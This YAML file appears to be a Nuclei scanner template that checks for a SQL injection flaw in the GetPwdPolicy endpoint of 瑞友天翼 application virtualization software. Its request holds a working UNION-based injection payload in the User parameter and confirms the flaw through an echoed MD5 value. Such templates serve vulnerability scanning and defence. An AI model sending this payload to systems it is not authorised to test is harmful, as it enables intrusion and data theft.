id: poc-yaml-gwt-system-getpwdpolicy-sqli
info:
  name: 瑞友天翼应用虚拟化系统 GetPwdPolicy SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        GET /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+MD5({{t1}})%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "result=0"
          - "PwdPolicy="
      - type: regex
        regex:
          - "~{{t2}}~"
      - type: word
        words:
          - "<"
        negative: true
